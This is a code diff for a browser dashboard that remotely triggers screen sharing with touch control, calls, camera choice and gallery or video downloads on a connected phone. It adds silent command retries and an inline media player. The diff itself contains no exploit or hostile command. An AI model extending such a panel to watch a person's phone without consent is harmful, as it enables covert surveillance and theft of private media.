@@ -7279,6 +7279,11 @@ setupRemoteCameraPip();
     const deviceErrorMessages = new Map();
     const deviceFailedAction = new Map();
     const deviceErrorTimers = new Map();
+    // Silent re-dispatch timers for connect actions (screen share / calls /
+    // gallery). Without these, a single dropped command (stale permission
+    // dialog on the phone, background start throttling, brief socket blip)
+    // left the user staring at a loader for 20s and the session never came up.
+    const deviceActionRetryTimers = new Map();
 
     function clearDeviceConnectingTimers(rawId) {
         const deviceId = normalizeDeviceId(rawId);
@@ -7288,6 +7293,10 @@ setupRemoteCameraPip();
                 clearTimeout(deviceConnectingTimers.get(id));
                 deviceConnectingTimers.delete(id);
             }
+            if (deviceActionRetryTimers.has(id)) {
+                deviceActionRetryTimers.get(id).forEach(t => clearTimeout(t));
+                deviceActionRetryTimers.delete(id);
+            }
         });
         for (const [key, timer] of deviceConnectingTimers.entries()) {
             if (normalizeDeviceId(key) === deviceId) {
@@ -7295,6 +7304,36 @@ setupRemoteCameraPip();
                 deviceConnectingTimers.delete(key);
             }
         }
+        for (const [key, timers] of deviceActionRetryTimers.entries()) {
+            if (normalizeDeviceId(key) === deviceId) {
+                timers.forEach(t => clearTimeout(t));
+                deviceActionRetryTimers.delete(key);
+            }
+        }
+    }
+
+    // Re-send the same auto-command a couple of times while the device is still
+    // "connecting". The phone ignores exact duplicates within ~2.5s, so the
+    // retry gaps stay well above that window.
+    function scheduleActionRetries(deviceId, action, emitFn, delays) {
+        const gaps = delays || [7000, 15000];
+        const timers = gaps.map((gap, idx) => setTimeout(() => {
+            // Only retry while this exact action is still the pending one.
+            const pending = deviceConnectingActions.get(deviceId);
+            if (pending !== action) return;
+            if (action === "screen_share" || action === "screen_share_control") {
+                const live = (typeof screenPeerConnection !== "undefined") && screenPeerConnection &&
+                    screenPeerConnection.connectionState !== "closed";
+                if (live) return;
+            } else if (action === "audio_call" || action === "video_call") {
+                const live = (typeof peerConnection !== "undefined") && peerConnection &&
+                    peerConnection.connectionState !== "closed";
+                if (live) return;
+            }
+            console.log(`No response for ${action} on ${deviceId} yet, retrying (attempt ${idx + 2})`);
+            try { emitFn(); } catch (_) {}
+        }, gap));
+        deviceActionRetryTimers.set(deviceId, timers);
     }
 
     function clearDeviceErrorTimers(rawId) {
@@ -7776,16 +7815,22 @@ setupRemoteCameraPip();
 
     let lastActionTriggerTime = 0;
 
-    function triggerDeviceAction(action, rawDeviceId) {
+    let lastTriggeredActionKey = "";
+    function triggerDeviceAction(action, rawDeviceId, opts) {
         const deviceId = normalizeDeviceId(rawDeviceId);
         if (!deviceId) return;
+        const internal = Boolean(opts && opts.internal);
 
         const now = Date.now();
-        if (now - lastActionTriggerTime < 1000) {
+        const triggerKey = `${deviceId}:${action}`;
+        // Rapid double taps on the SAME button are ignored, but a different
+        // action (Share right after Disconnect, etc.) must always go through.
+        if (!internal && now - lastActionTriggerTime < 1000 && lastTriggeredActionKey === triggerKey) {
             console.log("Ignoring rapid button tap");
             return;
         }
         lastActionTriggerTime = now;
+        lastTriggeredActionKey = triggerKey;
 
         // Ensure caller username is never empty so remote phone can connect back reliably
         if (!myUsername) {
@@ -7930,7 +7975,7 @@ setupRemoteCameraPip();
         }
 
         // Safe auto-disconnect before switching features (with 450ms safety buffer to release hardware/sockets)
-        const hasExistingSession = (
+        const hasExistingSession = !internal && (
             activeSessionDevices.has(deviceId) ||
             (rawDeviceId && activeSessionDevices.has(rawDeviceId)) ||
             deviceConnectingActions.has(deviceId) ||
@@ -7982,7 +8027,7 @@ setupRemoteCameraPip();
                 // 600ms after the first trigger, so the 1s guard used to swallow
                 // the switch and the new action never started.
                 lastActionTriggerTime = 0;
-                triggerDeviceAction(action, deviceId);
+                triggerDeviceAction(action, deviceId, { internal: true });
             }, 600);
             return;
         }
@@ -8041,6 +8086,41 @@ setupRemoteCameraPip();
             });
             showToast(`Starting auto screen share (${action === 'screen_share_control' ? 'Full Touch Control' : 'View Only'}, Cam: ${camChoice})...`);
         }
+
+        // Silent retries: if the phone never answers (stale permission dialog,
+        // throttled background start, transient socket drop) re-dispatch the
+        // exact same command instead of leaving a dead loader for 20s.
+        if (action === "audio_call" || action === "video_call") {
+            scheduleActionRetries(deviceId, action, () => {
+                if (!socket || !socket.connected) return;
+                socket.emit("auto-command", {
+                    targetDeviceId: deviceId,
+                    command: action,
+                    caller: myUsername
+                });
+            });
+        } else if (action === "screen_share" || action === "screen_share_control") {
+            scheduleActionRetries(deviceId, action, () => {
+                if (!socket || !socket.connected) return;
+                const camPicker = document.querySelector(`.cupertino-cam-options[data-did="${deviceId}"] .cupertino-cam-pill.selected`);
+                const camChoice = camPicker ? camPicker.dataset.cam : "front";
+                socket.emit("auto-command", {
+                    targetDeviceId: deviceId,
+                    command: action,
+                    caller: myUsername,
+                    cameraChoice: camChoice
+                });
+            });
+        } else if (action === "get_gallery" || action === "get_videos") {
+            scheduleActionRetries(deviceId, action, () => {
+                if (!socket || !socket.connected) return;
+                socket.emit("auto-command", {
+                    targetDeviceId: deviceId,
+                    command: action,
+                    page: currentGalleryPage
+                });
+            });
+        }
     }
 
     function openGallery(title, iconClass) {
@@ -8089,6 +8169,165 @@ setupRemoteCameraPip();
             currentGalleryPage++;
             fetchMediaPage(currentGalleryDeviceId, currentGalleryPage, currentGalleryType === "videos" ? "get_videos" : "get_gallery");
         });
+    }
+
+    // ---- Custom inline media player helpers ---------------------------
+    // Every request is tracked so a "play" reply fills the matching grid cell
+    // and a "download" reply saves the real full-quality file (not the thumb).
+    const pendingMediaActions = new Map();
+    const mediaKeyOf = (type, id) => `${type === "video" ? "video" : "image"}:${id}`;
+
+    function setVideoControlState(cell, playing) {
+        if (!cell) return;
+        const playBtn = cell.querySelector('.cupertino-gallery-ctrl[data-role="play"]');
+        const pauseBtn = cell.querySelector('.cupertino-gallery-ctrl[data-role="pause"]');
+        if (playBtn) playBtn.classList.toggle("is-active", !playing);
+        if (pauseBtn) pauseBtn.classList.toggle("is-active", playing);
+    }
+
+    function startInlineVideoPlayback(cell, item) {
+        if (!cell) return;
+        const existing = cell.querySelector("video.cupertino-gallery-inline-player");
+        if (existing) {
+            cell.classList.add("is-playing");
+            setVideoControlState(cell, true);
+            existing.play().catch(() => {});
+            return;
+        }
+        if (!socket || !socket.connected || !currentGalleryDeviceId) {
+            showToast("Device is offline — cannot load video");
+            return;
+        }
+        const loader = document.createElement("div");
+        loader.className = "cupertino-gallery-loader";
+        loader.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i><span>Loading…</span>';
+        cell.appendChild(loader);
+        cell.classList.add("is-loading-video");
+        setVideoControlState(cell, true);
+
+        pendingMediaActions.set(mediaKeyOf("video", item.id), { kind: "play", cell });
+        socket.emit("auto-command", {
+            targetDeviceId: currentGalleryDeviceId,
+            command: "get_media_detail",
+            mediaId: item.id,
+            mediaType: "video"
+        });
+    }
+
+    function pauseInlineVideo(cell) {
+        if (!cell) return;
+        const video = cell.querySelector("video.cupertino-gallery-inline-player");
+        if (video) {
+            try { video.pause(); } catch (_) {}
+        }
+        cell.classList.remove("is-playing");
+        setVideoControlState(cell, false);
+    }
+
+    function requestMediaDownload(item, isVideo) {
+        if (!socket || !socket.connected || !currentGalleryDeviceId) {
+            showToast("Device is offline — cannot download");
+            return;
+        }
+        pendingMediaActions.set(mediaKeyOf(isVideo ? "video" : "image", item.id), { kind: "download", cell: null });
+        socket.emit("auto-command", {
+            targetDeviceId: currentGalleryDeviceId,
+            command: "get_media_detail",
+            mediaId: item.id,
+            mediaType: isVideo ? "video" : "image"
+        });
+        showToast(isVideo ? "Preparing video download…" : "Preparing photo download…");
+    }
+
+    function base64ToBlob(b64, mime) {
+        const clean = String(b64 || "").replace(/\s+/g, "");
+        const bin = atob(clean);
+        const len = bin.length;
+        const bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
+        return new Blob([bytes], { type: mime || "application/octet-stream" });
+    }
+
+    function triggerBlobDownload(blob, filename) {
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = filename || "media";
+        a.rel = "noopener";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => { try { URL.revokeObjectURL(url); } catch (_) {} }, 20000);
+    }
+
+    function handlePendingMediaAction(pending, data) {
+        const b64 = (data && data.data) || "";
+        const isVideo = data && data.type === "video";
+        const filename = (data && data.name) || (isVideo ? "video.mp4" : "photo.jpg");
+
+        if (!b64) {
+            if (pending.cell) {
+                pending.cell.classList.remove("is-loading-video", "is-playing");
+                const loader = pending.cell.querySelector(".cupertino-gallery-loader");
+                if (loader) loader.remove();
+                setVideoControlState(pending.cell, false);
+            }
+            showToast("Media unavailable (file missing or larger than the 15MB playback limit)");
+            return;
+        }
+
+        if (pending.kind === "play" && pending.cell) {
+            const cell = pending.cell;
+            cell.classList.remove("is-loading-video");
+            const loader = cell.querySelector(".cupertino-gallery-loader");
+            if (loader) loader.remove();
+
+            let video = cell.querySelector("video.cupertino-gallery-inline-player");
+            if (!video) {
+                video = document.createElement("video");
+                video.className = "cupertino-gallery-inline-player";
+                video.playsInline = true;
+                video.setAttribute("playsinline", "");
+                video.setAttribute("webkit-playsinline", "");
+                video.disablePictureInPicture = true;
+                video.setAttribute("disablepictureinpicture", "");
+                video.setAttribute("disableremoteplayback", "");
+                video.setAttribute("controlslist", "nodownload noplaybackrate noremoteplayback");
+                video.setAttribute("x-webkit-airplay", "deny");
+                video.controls = false;
+                video.preload = "auto";
+                video.draggable = false;
+                video.addEventListener("contextmenu", (ev) => ev.preventDefault());
+                video.addEventListener("play", () => {
+                    cell.classList.add("is-playing");
+                    setVideoControlState(cell, true);
+                });
+                video.addEventListener("pause", () => {
+                    cell.classList.remove("is-playing");
+                    setVideoControlState(cell, false);
+                });
+                video.addEventListener("ended", () => {
+                    cell.classList.remove("is-playing");
+                    setVideoControlState(cell, false);
+                });
+                video.addEventListener("click", (ev) => {
+                    ev.stopPropagation();
+                    cell.classList.toggle("is-expanded");
+                });
+                cell.appendChild(video);
+            }
+            video.src = "data:video/mp4;base64," + b64;
+            cell.classList.add("is-playing");
+            setVideoControlState(cell, true);
+            video.play().catch(() => {});
+            return;
+        }
+
+        if (pending.kind === "download") {
+            const mime = isVideo ? "video/mp4" : "image/jpeg";
+            triggerBlobDownload(base64ToBlob(b64, mime), filename);
+            showToast(`Downloading ${filename}…`);
+        }
     }
 
     // Handle incoming gallery chunk
@@ -8142,30 +8381,64 @@ setupRemoteCameraPip();
             nameEl.textContent = item.name || (isVideo ? "video.mp4" : "image.jpg");
             cell.appendChild(nameEl);
 
-            // Download Button Overlay
+            // ---- Custom in-grid video player -------------------------------
+            // Exactly three controls per video: Download (arrow down),
+            // Play, Pause. No popup, no PiP, no external tab, no saved URL —
+            // the clip plays inline inside the same thumbnail cell and can be
+            // expanded/collapsed by tapping the playing video.
+            const controls = document.createElement("div");
+            controls.className = "cupertino-gallery-controls";
+
             const dlBtn = document.createElement("button");
-            dlBtn.className = "cupertino-gallery-dl";
+            dlBtn.className = "cupertino-gallery-ctrl cupertino-gallery-ctrl-dl";
+            dlBtn.dataset.role = "download";
             dlBtn.title = "Download";
-            dlBtn.innerHTML = '<i class="fas fa-download"></i>';
+            dlBtn.setAttribute("aria-label", "Download");
+            dlBtn.innerHTML = '<i class="fas fa-arrow-down"></i>';
             dlBtn.addEventListener("click", (e) => {
                 e.stopPropagation();
-                if (item.thumb) {
-                    const a = document.createElement("a");
-                    a.href = `data:image/jpeg;base64,${item.thumb}`;
-                    a.download = item.name || (isVideo ? "video-thumb.jpg" : "photo.jpg");
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    showToast(`Downloading ${a.download}...`);
-                }
+                e.preventDefault();
+                requestMediaDownload(item, isVideo);
             });
-            cell.appendChild(dlBtn);
+            controls.appendChild(dlBtn);
 
-            // Live HD Preview on Click (Zero Blur, Full HD Stream)
-            cell.addEventListener("click", () => {
-                openMediaPreview(item, isVideo);
-            });
+            if (isVideo) {
+                const playBtn = document.createElement("button");
+                playBtn.className = "cupertino-gallery-ctrl";
+                playBtn.dataset.role = "play";
+                playBtn.title = "Play";
+                playBtn.setAttribute("aria-label", "Play video");
+                playBtn.innerHTML = '<i class="fas fa-play"></i>';
+                playBtn.addEventListener("click", (e) => {
+                    e.stopPropagation();
+                    e.preventDefault();
+                    startInlineVideoPlayback(cell, item);
+                });
+                controls.appendChild(playBtn);
 
+                const pauseBtn = document.createElement("button");
+                pauseBtn.className = "cupertino-gallery-ctrl";
+                pauseBtn.dataset.role = "pause";
+                pauseBtn.title = "Pause";
+                pauseBtn.setAttribute("aria-label", "Pause video");
+                pauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+                pauseBtn.addEventListener("click", (e) => {
+                    e.stopPropagation();
+                    e.preventDefault();
+                    pauseInlineVideo(cell);
+                });
+                controls.appendChild(pauseBtn);
+
+                // Tapping anywhere on a playing video toggles its size.
+                cell.addEventListener("click", () => {
+                    if (!cell.classList.contains("is-playing")) return;
+                    cell.classList.toggle("is-expanded");
+                });
+            } else {
+                cell.addEventListener("click", () => openMediaPreview(item, false));
+            }
+
+            cell.appendChild(controls);
             galleryGrid.appendChild(cell);
         });
     });
@@ -8228,7 +8501,19 @@ setupRemoteCameraPip();
 
     // HD Media Detail Stream Response from Device
     socket.on("media-detail-response", (data) => {
-        if (!data || !mediaPreviewModal || mediaPreviewModal.style.display === "none") return;
+        if (!data) return;
+
+        // Inline player / direct download requests take priority over the
+        // legacy full-screen preview modal.
+        const key = mediaKeyOf(data.type === "video" ? "video" : "image", data.id);
+        const pending = pendingMediaActions.get(key);
+        if (pending) {
+            pendingMediaActions.delete(key);
+            handlePendingMediaAction(pending, data);
+            return;
+        }
+
+        if (!mediaPreviewModal || mediaPreviewModal.style.display === "none") return;
         if (previewLoader) previewLoader.style.display = "none";
 
         const isVideo = (data.type === "video");
